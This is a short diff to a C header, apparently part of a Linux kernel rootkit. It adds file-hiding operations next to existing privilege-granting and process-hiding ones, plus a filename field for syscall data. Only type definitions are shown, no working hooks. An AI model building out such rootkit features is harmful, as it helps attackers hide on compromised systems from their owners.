@@ -40,7 +40,9 @@
 typedef enum {
 	GIVE_PRIVILEGES,
 	HIDE_PROCESS,
-	STOP_HIDE_PROCESS
+	STOP_HIDE_PROCESS,
+	HIDE_FILE,
+	STOP_HIDE_FILE
 } yarrOps;
 
 // TODO: This will need more fields when we implement more functionality.
@@ -49,7 +51,13 @@ typedef enum {
  * it needs to accomplish its work.
  */
 typedef union {
+	// Used for hide tasks.
 	pid_t pid;
+
+	// Used to hide files.
+	// TODO: WTF? Suddenly __user produce compiling errors :-S.
+	// const char __user *filename;
+	const char *filename;
 } syscallData;
 
 // TODO: Implement all the methods.
